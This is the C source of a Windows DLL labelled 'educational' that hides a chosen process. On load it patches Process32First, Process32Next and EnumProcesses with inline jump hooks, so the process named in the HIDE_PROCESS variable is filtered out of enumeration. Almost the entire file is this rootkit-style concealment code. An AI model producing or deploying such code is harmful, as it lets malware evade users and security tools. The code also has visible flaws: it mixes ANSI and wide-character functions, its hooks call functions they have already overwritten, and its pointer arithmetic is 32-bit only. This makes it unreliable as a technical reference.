/**
 * Windows Process Hiding Library - Educational Purpose Only
 * 
 * This code demonstrates how process hiding works by hooking
 * Windows API functions related to process enumeration.
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <psapi.h>

// Target process name to hide
char TARGET_PROCESS[MAX_PATH] = {0};

// Function pointer types for the functions we'll hook
typedef BOOL (WINAPI *PROCESS32NEXT)(HANDLE, LPPROCESSENTRY32);
typedef BOOL (WINAPI *PROCESS32FIRST)(HANDLE, LPPROCESSENTRY32);
typedef DWORD (WINAPI *ENUMPROCESSES)(DWORD*, DWORD, LPDWORD);

// Original function pointers
PROCESS32NEXT OriginalProcess32Next = NULL;
PROCESS32FIRST OriginalProcess32First = NULL;
ENUMPROCESSES OriginalEnumProcesses = NULL;

// Get the process ID from a name
DWORD GetProcessIdByName(const char* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(snapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe32));
    }
    
    CloseHandle(snapshot);
    return 0;
}

// Hooked Process32Next function
BOOL WINAPI HookedProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
    BOOL result;
    
    // Call original function
    result = OriginalProcess32Next(hSnapshot, lppe);
    
    // If successful and the process matches our target, skip it
    if (result && _stricmp(lppe->szExeFile, TARGET_PROCESS) == 0) {
        // Call original again to get the next process instead
        return OriginalProcess32Next(hSnapshot, lppe);
    }
    
    return result;
}

// Hooked Process32First function
BOOL WINAPI HookedProcess32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
    BOOL result;
    
    // Call original function
    result = OriginalProcess32First(hSnapshot, lppe);
    
    // If successful and the process matches our target, skip it
    if (result && _stricmp(lppe->szExeFile, TARGET_PROCESS) == 0) {
        // Call original Process32Next to get the next process instead
        return OriginalProcess32Next(hSnapshot, lppe);
    }
    
    return result;
}

// Hooked EnumProcesses function
BOOL WINAPI HookedEnumProcesses(DWORD* pProcessIds, DWORD cb, LPDWORD pBytesReturned) {
    // Call original function
    BOOL result = OriginalEnumProcesses(pProcessIds, cb, pBytesReturned);
    
    if (result) {
        DWORD targetPid = GetProcessIdByName(TARGET_PROCESS);
        if (targetPid == 0) return result; // Target not found
        
        DWORD count = *pBytesReturned / sizeof(DWORD);
        DWORD newCount = 0;
        
        // Filter out the target process
        for (DWORD i = 0; i < count; i++) {
            if (pProcessIds[i] != targetPid) {
                pProcessIds[newCount++] = pProcessIds[i];
            }
        }
        
        // Update returned byte count
        *pBytesReturned = newCount * sizeof(DWORD);
    }
    
    return result;
}

// Set up function hooks
BOOL SetupHooks() {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE hPsapi = GetModuleHandleA("psapi.dll");
    
    if (!hKernel32 || !hPsapi) {
        return FALSE;
    }
    
    // Get addresses of original functions
    OriginalProcess32Next = (PROCESS32NEXT)GetProcAddress(hKernel32, "Process32NextW");
    OriginalProcess32First = (PROCESS32FIRST)GetProcAddress(hKernel32, "Process32FirstW");
    OriginalEnumProcesses = (ENUMPROCESSES)GetProcAddress(hPsapi, "EnumProcesses");
    
    if (!OriginalProcess32Next || !OriginalProcess32First || !OriginalEnumProcesses) {
        return FALSE;
    }
    
    // Set up hooks by modifying memory protection and writing jump instructions
    DWORD oldProtect;
    
    // Hook Process32Next
    VirtualProtect(OriginalProcess32Next, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)OriginalProcess32Next = 0xE9; // JMP instruction
    *(DWORD*)((BYTE*)OriginalProcess32Next + 1) = (DWORD)HookedProcess32Next - (DWORD)OriginalProcess32Next - 5;
    VirtualProtect(OriginalProcess32Next, 5, oldProtect, &oldProtect);
    
    // Hook Process32First
    VirtualProtect(OriginalProcess32First, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)OriginalProcess32First = 0xE9; // JMP instruction
    *(DWORD*)((BYTE*)OriginalProcess32First + 1) = (DWORD)HookedProcess32First - (DWORD)OriginalProcess32First - 5;
    VirtualProtect(OriginalProcess32First, 5, oldProtect, &oldProtect);
    
    // Hook EnumProcesses
    VirtualProtect(OriginalEnumProcesses, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)OriginalEnumProcesses = 0xE9; // JMP instruction
    *(DWORD*)((BYTE*)OriginalEnumProcesses + 1) = (DWORD)HookedEnumProcesses - (DWORD)OriginalEnumProcesses - 5;
    VirtualProtect(OriginalEnumProcesses, 5, oldProtect, &oldProtect);
    
    return TRUE;
}

// DLL entry point
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Read target process from environment variable
            if (GetEnvironmentVariableA("HIDE_PROCESS", TARGET_PROCESS, MAX_PATH)) {
                SetupHooks();
                
                // Create a hidden log file for educational purposes
                FILE* logFile = fopen("C:\\process_hider_log.txt", "w");
                if (logFile) {
                    fprintf(logFile, "Process hiding active for: %s\n", TARGET_PROCESS);
                    fprintf(logFile, "Educational purposes only!\n");
                    fclose(logFile);
                }
            }
            break;
        case DLL_PROCESS_DETACH:
            // Cleanup could be implemented here
            break;
    }
    
    return TRUE;
}
